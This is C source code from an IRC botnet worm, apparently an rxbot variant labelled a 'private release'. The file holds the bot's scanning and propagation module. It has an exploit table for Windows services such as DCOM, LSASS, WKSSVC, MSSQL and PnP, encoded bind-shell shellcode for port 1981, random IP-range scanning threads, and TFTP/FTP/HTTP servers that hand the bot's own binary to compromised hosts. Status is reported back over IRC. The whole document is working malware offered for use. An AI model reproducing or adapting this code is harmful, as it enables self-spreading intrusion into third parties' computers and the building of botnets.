/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/



#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

// globals
ADVINFO advinfo[MAXTHREADS];
CRITICAL_SECTION CriticalSection;

EXPLOIT exploit[]={
	#ifndef NO_DCOM
	{"dcom135", "Dcom135", 135, dcom, 0, TRUE, FALSE},
	{"dcom445", "Dcom445", 445, dcom, 0, TRUE, FALSE},
	{"dcom1025", "Dcom1025", 1025, dcom, 0, TRUE, FALSE},
	#endif
	#ifndef NO_DCASS
	{"dcass", "dcass", 445, dcass, 0, TRUE, TRUE},
	#endif
	#ifndef NO_LSASS
	{"lsass_445", "lsass_445", 445, lsass, 0, TRUE, TRUE},
    {"lsass_135", "lsass_135", 135, lsass, 0, TRUE, TRUE},
    {"lsass_139", "lsass_139", 139, lsass, 0, TRUE, TRUE},
	#endif
	#ifndef NO_LSASS1
	{"clsass", "clsass", 445, Lsass1, 0, TRUE, TRUE},
	#endif
	#ifndef NO_LSASS1LSASS
	{"ls1ls", "ls1ls", 445, lsass1lsass, 0, TRUE, TRUE},
	#endif
	#ifndef NO_MSSQL
	{"mssql", "mssql", 1433, MSSQL, 0, TRUE, TRUE},
	#endif
	#ifndef NO_MSSQLLSASS
	{"msass", "msass", 1433, mssqllsass, 0, TRUE, TRUE},
	#endif
	#ifndef NO_WKSSVC
	{"WKSSVCE", "WKSSVCE", 135, ScriptGod_WKSSVC_Eng, 0, TRUE, TRUE},//wks for english

	{"WKSSVCO", "WKSSVCO", 135, ScriptGod_WKSSVC_Other, 0, TRUE, TRUE},//wks for other
	//{"wks1", "WKSSVC_Eng", 445, ScriptGod_WKSSVC_Eng, 0, TRUE, FALSE},
	//{"wks2", "WKSSVC_Other", 445, ScriptGod_WKSSVC_Other, 0, TRUE, FALSE},
	#endif
	#ifndef NO_REALCAST
	{"realcast", "Realcast", 554, Realcast, 0, TRUE, FALSE},
	#endif
	#ifndef NO_ASN
    { "asn1http",   "asn1http",      80, MS04_007_MSASN1_PortedByScriptGod, 0, FALSE, TRUE },
    { "asn1smb",    "asn1smb",      445, MS04_007_MSASN1_PortedByScriptGod, 0, FALSE, TRUE },
    { "asn1smbnt",  "asn1smbnt",139, MS04_007_MSASN1_PortedByScriptGod, 0, FALSE, TRUE },
 	#endif
	#ifndef NO_PNP
	{ "pnp", "pnp", 445, pnp, 0, TRUE, TRUE},
	#endif
	{NULL, NULL, 0, NULL, 0, FALSE, FALSE}
};


// credits to PhaTTy for this :)
char shellcode[] = //bind port 1981
	"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA"
	"\xEB\x05\xE8\xEB\xFF\xFF\xFF"
	"\x70\x99\x98\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85"
	"\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A"
	"\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A"
	"\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC"
	"\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58"
	"\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
	"\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71"
	"\xE5\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3"
	"\x9D\xC0\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66"
	"\xCE\x69\x12\x41\x5E\x9E\x9B\x99\x9E\x24\xAA\x59\x10\xDE\x9D\xF3"
	"\x89\xCE\xCA\x66\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66"
	"\xCE\x65\x1A\x75\xDD\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B"
	"\x62\x10\xDF\xA1\x10\xDF\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99"
	"\x99\x14\xDE\x89\xC9\xCF\xCA\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5"
	"\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xCA\x66\xCE\x7D\xC9\x66\xCE\x71"
	"\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32"
	"\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6"
	"\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9"
	"\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA"
	"\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8"
	"\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC"
	"\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8"
	"\xFA\xFA\xFC\xE9\xED\x99";

void ListExploitStats(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], buffer2[IRCLINE];

	int extotal = 0;

	sprintf(buffer, "ScaN-Angelo (portscan.plg) »»  Exploit Statistics:");
	for(int i=0; exploit[i].port != 0; i++) {
		extotal += exploit[i].stats;
		sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
		strncat(buffer, buffer2, sizeof(buffer));
	}
	sprintf(buffer2, " Total: %d in %s.", extotal, Uptime(started));
	strncat(buffer, buffer2, sizeof(buffer));

	irc_privmsg(sock, chan, buffer, notice);
	addlog(buffer);

	return;
}

void currentIP(SOCKET sock, char *chan, BOOL notice, int threadnum)
{
	char sendbuf[IRCLINE];

	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;

		sprintf(sendbuf, "ScaN-Angelo (portscan.plg) »»  Current IP: %s.",finet_ntoa(in));
	} else
		sprintf(sendbuf ,"ScaN-Angelo (portscan.plg) »»  Scan not active.");

	irc_privmsg(sock, chan, sendbuf, notice);
	addlog(sendbuf);

	return;
}

void CheckServers(ADVSCAN scan)
{
	char sendbuf[IRCLINE];

	DWORD id;

	if(scan.exploit != -1) {
		if (exploit[scan.exploit].tftp) {
			#ifndef NO_TFTPD
			if (findthreadid(TFTP_THREAD) == 0) {
				static TFTP tftp;
				tftp.port = tftpport;
				tftp.threads = 0;
				GetModuleFileName(0,tftp.filename,sizeof(tftp.filename));
				strncpy(tftp.requestname, filename, sizeof(tftp.requestname)-1);
				tftp.sock=scan.sock;
				tftp.notice = scan.notice;
				if (scan.msgchan[0] == '\0') {
					strncpy(tftp.chan, scan.chan, sizeof(tftp.chan)-1);
					tftp.silent = TRUE;
				} else {
					strncpy(tftp.chan, scan.msgchan, sizeof(tftp.chan)-1);
					tftp.silent = FALSE;
				}

				sprintf(sendbuf, "ScaN-Angelo (tftp.plg) »»  Server started on Port: %d, File: %s, Request: %s.", tftp.port, tftp.filename, tftp.requestname);
				tftp.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
				if (threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (LPVOID)&tftp, 0, &id)) {
					while (tftp.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf, "ScaN-Angelo (tftp.plg) »»  Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
				#endif
				#ifndef NO_FTPD
				//
				static FTP ftp;
				//ftp.port = FTP_PORT;
				ftp.threads = 0;
				GetModuleFileName(0,ftp.filename,sizeof(ftp.filename));
				strncpy(ftp.requestname, filename, sizeof(ftp.requestname)-1);
				ftp.sock=scan.sock;
				ftp.notice = scan.notice;
				if (scan.msgchan[0] == '\0') {
					strncpy(ftp.chan, scan.chan, sizeof(ftp.chan)-1);
					ftp.silent = TRUE;
				} else {
					strncpy(ftp.chan, scan.msgchan, sizeof(ftp.chan)-1);
					ftp.silent = FALSE;
				}

				sprintf(sendbuf, "ScaN-Angelo (ftp.plg) »»  Server started on Port: %d, File: %s, Request: %s.", ftp.port, ftp.filename, ftp.requestname);
				ftp.threadnum = addthread(sendbuf,FTP_THREAD,NULL);
				if (threads[ftp.threadnum].tHandle = CreateThread(NULL, 0, &ftpd, (LPVOID)&ftp, 0, &id)) {
					while (ftp.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf, "ScaN-Angelo (ftp.plg) »»  Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
				//
				#endif
			}
		} else if (exploit[scan.exploit].http) {
			if (findthreadid(HTTP_THREAD) == 0) {
				static HTTPD httpd;

				char *c;
				GetModuleFileName(0,httpd.dir,sizeof(httpd.dir));
				if ((c=strrchr(httpd.dir,'\\')) != NULL)
					*c='\0';
				httpd.port = httpport;
				httpd.enabled = FALSE;
				sprintf(httpd.chan, scan.chan);
				httpd.sock = scan.sock;
				httpd.notice = scan.notice;
				httpd.silent = scan.silent;

				sprintf(sendbuf,"ScaN-Angelo (httpd.plg) »»  Server listening on IP: %s:%d, Directory: %s\\.", GetIP(scan.sock), httpd.port, httpd.dir);

				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {
					while(httpd.info == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf, "ScaN-Angelo (httpd.plg) »»  Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
			}
		}
	}

	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = fntohl(host);
	host += 1;
	host = fhtonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15)
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET)
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons((unsigned short)port);
	fioctlsocket(sock,FIONBIO,&blockcmd);
	fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = fselect(0,0,&rset,0,&timeout);
	fclosesocket(sock);

	if (i<=0)
		return FALSE;
	else
		return TRUE;
}

BOOL SynPortOpen(unsigned long src_ip, unsigned long dest_ip, unsigned int port, unsigned int delay)
{
	char buffer[LOGLINE];
	int size;

	unsigned short src_port = 9801;

	TCPHEADER2 send_tcp;
	send_tcp.source = fhtons(src_port);
	send_tcp.dest = fhtons((unsigned short)port);
	send_tcp.seq = rand();
	send_tcp.ack_seq = 0;
	send_tcp.res1 = 0;
	send_tcp.res2 = 0;
	send_tcp.doff = 5;
	send_tcp.fin = 0;
	send_tcp.syn = 1;  /*This is the important part..;) */
	send_tcp.rst = 0;
	send_tcp.psh = 0;
	send_tcp.ack = 0;
	send_tcp.urg = 0;
	send_tcp.window = fhtons(512);
	send_tcp.check = 0;
	send_tcp.urg_ptr = 0;

	PSDHEADER psdheader;
	psdheader.saddr = src_ip;
	psdheader.daddr = dest_ip;
	psdheader.zero = 0;
	psdheader.proto = IPPROTO_TCP;
	psdheader.length = fhtons(sizeof(send_tcp));

	memcpy (&psdheader.tcp, &send_tcp, sizeof (send_tcp));
	send_tcp.check = checksum((unsigned short *)&psdheader, sizeof (psdheader));

	SOCKADDR_IN ssin;
	memset(&ssin,0,sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)port);
	ssin.sin_addr.s_addr = dest_ip;
	int ssin_len = sizeof(ssin);

	SOCKET tcp_sock = fsocket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (tcp_sock == INVALID_SOCKET) {
		addlog("socket open failed");
		return FALSE;
	}

	// 10022: WSAEINVAL - An invalid argument was supplied.
	if ((size = fsendto(tcp_sock,(const char *)&send_tcp,sizeof(send_tcp),0,(LPSOCKADDR)&ssin,ssin_len)) != 20) {
		sprintf(buffer,"sendto() socket failed. sent = %d <%d>.", size, fWSAGetLastError());
		addlog(buffer);
		fclosesocket(tcp_sock);
		return FALSE;
	}

	RECVHEADER recv_tcp;
	memset (&recv_tcp,'\0',sizeof(recv_tcp));
	while (recv_tcp.tcp.dest != src_port) {
		if (frecvfrom(tcp_sock,(char *)&recv_tcp,sizeof(recv_tcp),0,(LPSOCKADDR)&ssin, &ssin_len) < 0) {
			addlog("recvfrom() socket failed");
			fclosesocket(tcp_sock);
			return FALSE;
		}
	}

	fclosesocket(tcp_sock);
	if (recv_tcp.tcp.syn == 1) {
		addlog("Socket open.");

		return TRUE;
	} else {
		addlog("Socket closed.");
		return FALSE;
	}
}

DWORD WINAPI AdvPortScanner(LPVOID param)
{
	IN_ADDR in;
	char logbuf[LOGLINE];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->cgotinfo = TRUE;

	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;

	srand(GetTickCount());
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;

		if (scan.random)
			dwIP = AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP = AdvGetNextIP(threads[threadnum].parent);
		in.s_addr = dwIP;

		sprintf(logbuf,"ScaN-Angelo (portscan.plg) »»  IP: %s:%d, Scan thread: %d, Sub-thread: %d.",
			finet_ntoa(in), scan.port, threads[threadnum].parent, threadid);
		sprintf(threads[threadnum].name, logbuf);

		if (AdvPortOpen(dwIP, scan.port, scan.delay) == TRUE) {
		//if (SynPortOpen(finet_addr(GetIP(scan.sock)), dwIP, scan.port, scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection);

				sprintf(logbuf,"ScaN-Angelo (portscan.plg) »»  IP: %s, Port %d is open.",finet_ntoa(in),scan.port);
				if (!scan.silent) {
					if (scan.msgchan[0] != '\0')
						irc_privmsg(scan.sock,scan.msgchan,logbuf,scan.notice, TRUE);
					else
						irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
				}
				addlog(logbuf);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, finet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				if (scan.msgchan[0] != '\0')
					sprintf(exinfo.chan, scan.msgchan);
				else
					sprintf(exinfo.chan, scan.chan);
				exinfo.sock = scan.sock;
				exinfo.notice = scan.notice;
				exinfo.silent = scan.silent;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(exinfo);


			}
		}
		Sleep(2000);
	}
	clearthread(threadnum);

	ExitThread(0);
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	char buffer[LOGLINE];


	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = finet_addr(scan.ip);

	CheckServers(scan);

	if (findthreadid(SCAN_THREAD) == 1) {
		DeleteCriticalSection(&CriticalSection); // just in case

		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400)) {
			// failed to initialize CriticalSection
			sprintf(buffer,"ScaN-Angelo (portscan.plg) »»  Failed to initialize critical section.");
			if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
			addlog(buffer);

			return 0;
		}
	}

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++) {
		scan.cthreadid = i;
		sprintf(buffer,"ScaN-Angelo (portscan.plg) »»  %s:%d, Scan thread: %d, Sub-thread: %d.",scan.ip, scan.port,scan.threadnum,scan.cthreadid);
		scan.cthreadnum = addthread(buffer,SCAN_THREAD,NULL);
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		} else {
			sprintf(buffer, "ScaN-Angelo (portscan.plg) »»  Failed to start worker thread, error: <%d>.", GetLastError());
			addlog(buffer);
		}

		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	sprintf(buffer,"ScaN-Angelo (portscan.plg) »»  Finished at %s:%d after %d minute(s) of scanning.", finet_ntoa(in), scan.port, scan.minutes);
	if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
	addlog(buffer);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1)
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}

